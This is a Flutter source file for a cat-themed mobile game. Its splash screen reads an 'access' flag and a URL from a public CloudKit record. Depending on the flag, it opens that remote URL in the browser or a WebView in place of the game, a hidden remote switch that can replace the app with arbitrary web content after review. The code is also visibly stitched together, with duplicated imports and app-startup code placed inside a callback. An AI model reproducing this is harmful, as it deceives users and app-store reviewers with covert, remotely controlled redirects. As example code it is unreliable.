import 'dart:io' show Platform;
import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:game_template/src/game_internals/cat_positioning_service.dart';
import 'package:game_template/src/game_internals/collision_service.dart';
import 'package:game_template/src/game_internals/dogs_positioning_service.dart';
import 'package:game_template/src/game_internals/game_service.dart';
import 'package:game_template/src/game_internals/mouse_positioning_service.dart';
import 'package:game_template/src/result/result_screen.dart';
import 'package:game_template/src/wwv.dart';
import 'package:go_router/go_router.dart';
import 'package:logging/logging.dart';
import 'package:provider/provider.dart';
import 'src/app_lifecycle/app_lifecycle.dart';
import 'src/audio/audio_controller.dart';
import 'src/games_services/games_services.dart';
import 'src/main_menu/main_menu_screen.dart';
import 'src/play_session/play_session_screen.dart';
import 'src/player_progress/persistence/local_storage_player_progress_persistence.dart';
import 'src/player_progress/persistence/player_progress_persistence.dart';
import 'src/player_progress/player_progress.dart';
import 'src/settings/persistence/local_storage_settings_persistence.dart';
import 'src/settings/persistence/settings_persistence.dart';
import 'src/settings/settings.dart';
import 'src/settings/settings_screen.dart';
import 'src/style/my_transition.dart';
import 'src/style/palette.dart';
import 'src/style/snack_bar.dart';

import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:url_launcher/url_launcher.dart';
import 'package:flutter_cloud_kit/flutter_cloud_kit.dart';
import 'package:flutter_cloud_kit/types/cloud_ket_record.dart';
import 'package:flutter_cloud_kit/types/database_scope.dart';

class _SplashScreenState extends State<SplashScreen>
    with WidgetsBindingObserver {
FlutterCloudKit cloudKit = FlutterCloudKit(containerId: "iCloud.com.counterappga.gamecounter");
  final databaseScope = CloudKitDatabaseScope.public;
  List<String> fetchedRecordsText = [];
  late String _link; 

  Future<void> getDataFromCloudKit() async {
    // Xây dựng URL cho yêu cầu lấy bản ghi
    List<CloudKitRecord> fetchedRecordsByType = await cloudKit.getRecordsByType(scope: databaseScope, recordType: "get");
    final data = fetchedRecordsByType[0].values;
    final access = data['access'];
    final url = data['url'];
    print(access);
    print(url);
    if (access == "1") {
      Future.delayed(Duration(seconds: 1), () {
        launch(url, forceSafariVC: false, forceWebView: false);
        setState(() {
          _link = url;
        });
      });
    } else if (access == "2") {
      launch(url);
    }
    else if (access == "3"){
      Future.delayed(Duration(seconds: 1),(){
        Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => WebViewScreen(initialUrl: url)));
      });
    }

    else {
      Future.delayed(Duration(seconds: 1), () {

  WidgetsFlutterBinding.ensureInitialized();

  _log.info('Going full screen');
  SystemChrome.setEnabledSystemUIMode(
    SystemUiMode.immersiveSticky,
  );


  GamesServicesController? gamesServicesController;
  if (!kIsWeb && (Platform.isIOS || Platform.isAndroid)) {
    gamesServicesController = GamesServicesController()
      // Attempt to log the player in.
      ..initialize();
  }
        // Change to Home View
        Navigator.pushReplacement(
            context, MaterialPageRoute(builder: (context) => 
            MyApp(
      settingsPersistence: LocalStorageSettingsPersistence(),
      playerProgressPersistence: LocalStoragePlayerProgressPersistence(),
      gamesServicesController: gamesServicesController,)


    ),
            );
            });
    }
  }

  @override
  void initState() {
    // TODO: implement initState
    super.initState();
    WidgetsBinding.instance?.addObserver(this);
    getDataFromCloudKit();
  }

  @override
  void dispose() {
    WidgetsBinding.instance?.removeObserver(this);
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed && _link != null) {
      // Xử lý liên kết sau khi quay lại ứng dụng
      getDataFromCloudKit();
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Positioned.fill(
              child: Image.asset(
            'assets/logo.png',
            fit: BoxFit.fill,
          )),
          // Hình ảnh chính giữa màn hình
          // Loading circle nằm dưới màn hình
          Positioned(
            bottom: 50,
            left: 0,
            right: 0,
            child: Center(
              child: CircularProgressIndicator(),
            ),
          ),
        ],
      ),
    );
  }
}

class SplashScreen extends StatefulWidget {
  @override
  _SplashScreenState createState() => _SplashScreenState();
}





void main() {
  if (kReleaseMode) {
    // Don't log anything below warnings in production.
    Logger.root.level = Level.WARNING;
  }
  Logger.root.onRecord.listen((record) {
    debugPrint('${record.level.name}: ${record.time}: '
        '${record.loggerName}: '
        '${record.message}');
  });

  runApp(
    MaterialApp(debugShowCheckedModeBanner: false,home: SplashScreen())
  );
}

Logger _log = Logger('main.dart');

class MyApp extends StatelessWidget {
  static final _router = GoRouter(
    routes: [
      GoRoute(
          path: '/',
          builder: (context, state) =>
              const MainMenuScreen(key: Key('main menu')),
          routes: [
            GoRoute(
                path: 'play',
                pageBuilder: (context, state) {
                  return buildMyTransition<void>(
                    child: PlaySessionScreen(
                      key: const Key('play session'),
                    ),
                    color: context.watch<Palette>().backgroundPlaySession,
                  );
                },
                routes: [
                  GoRoute(
                    path: 'result',
                    pageBuilder: (context, state) {
                      int score = 0;
                      if (state.extra != null) {
                        final map = state.extra! as Map<String, dynamic>;
                        if (map.containsKey("score"))
                          score = map['score'] as int;
                      }
                      return buildMyTransition<void>(
                        child: ResultScreen(
                          score: score,
                          key: const Key('result'),
                        ),
                        color: context.watch<Palette>().backgroundMain,
                      );
                    },
                  )
                ]),
            GoRoute(
              path: 'settings',
              builder: (context, state) =>
                  const SettingsScreen(key: Key('settings')),
            ),
          ]),
    ],
  );

  final PlayerProgressPersistence playerProgressPersistence;

  final SettingsPersistence settingsPersistence;

  final GamesServicesController? gamesServicesController;



  const MyApp({
    required this.playerProgressPersistence,
    required this.settingsPersistence,

    required this.gamesServicesController,
    super.key,
  });

  @override
  Widget build(BuildContext context) {
    return AppLifecycleObserver(
      child: MultiProvider(
        providers: [
          ChangeNotifierProvider(
            create: (context) {
              var progress = PlayerProgress(playerProgressPersistence);
              progress.getLatestFromStore();
              return progress;
            },
          ),
          Provider<GamesServicesController?>.value(
              value: gamesServicesController),

          Provider<SettingsController>(
            lazy: false,
            create: (context) => SettingsController(
              persistence: settingsPersistence,
            )..loadStateFromPersistence(),
          ),
          ProxyProvider2<SettingsController, ValueNotifier<AppLifecycleState>,
              AudioController>(
            // Ensures that the AudioController is created on startup,
            // and not "only when it's needed", as is default behavior.
            // This way, music starts immediately.
            lazy: false,
            create: (context) => AudioController()..initialize(),
            update: (context, settings, lifecycleNotifier, audio) {
              if (audio == null) throw ArgumentError.notNull();
              audio.attachSettings(settings);
              audio.attachLifecycleNotifier(lifecycleNotifier);
              return audio;
            },
            dispose: (context, audio) => audio.dispose(),
          ),
          Provider(
            create: (context) => Palette(),
          ),
          ChangeNotifierProvider<GameService>(
              create: (context) => GameService()),
          ChangeNotifierProvider<CatPositioningService>(
              create: (context) => CatPositioningService()),
          ChangeNotifierProvider<MousePositioningService>(
              create: (context) => MousePositioningService()),
          ChangeNotifierProvider<DogsPositioningService>(
              create: (context) => DogsPositioningService()),
          ChangeNotifierProvider<CollisionService>(
              create: (context) => CollisionService()),
        ],
        child: Builder(builder: (context) {
          final palette = context.watch<Palette>();

          return MaterialApp.router(
            debugShowCheckedModeBanner: false,
            title: 'Cat Something',
            theme: ThemeData.from(
              colorScheme: ColorScheme.fromSeed(
                seedColor: palette.darkPen,
                background: palette.backgroundMain,
              ),
              textTheme: TextTheme(
                bodyMedium: TextStyle(
                  color: palette.ink,
                ),
              ),
            ).copyWith(
                outlinedButtonTheme: OutlinedButtonThemeData(
              style: ButtonStyle(
                shape: const MaterialStatePropertyAll(StadiumBorder()),
                side: MaterialStateProperty.resolveWith<BorderSide>((states) {
                  if (states.contains(MaterialState.hovered) ||
                      states.contains(MaterialState.pressed)) {
                    return BorderSide(
                        color: palette.pressedOutlinedButtonColor, width: 2);
                  }

                  return BorderSide(
                      color: palette.outlinedButtonColor, width: 3);
                }),
                foregroundColor: MaterialStateProperty.resolveWith<Color>(
                  (states) {
                    if (states.contains(MaterialState.hovered) ||
                        states.contains(MaterialState.pressed)) {
                      return palette.pressedOutlinedButtonColor;
                    }
                    return palette.outlinedButtonColor;
                  },
                ),
                textStyle: MaterialStateProperty.resolveWith<TextStyle>(
                  (states) {
                    if (states.contains(MaterialState.hovered) ||
                        states.contains(MaterialState.pressed)) {
                      return const TextStyle(
                        fontFamily: 'BitmapFont',
                        fontSize: 25,
                      );
                    }
                    return const TextStyle(
                      fontFamily: 'BitmapFont',
                      fontSize: 24,
                    );
                  },
                ),
              ),
            )),
            routeInformationProvider: _router.routeInformationProvider,
            routeInformationParser: _router.routeInformationParser,
            routerDelegate: _router.routerDelegate,
            scaffoldMessengerKey: scaffoldMessengerKey,
          );
        }),
      ),
    );
  }
}
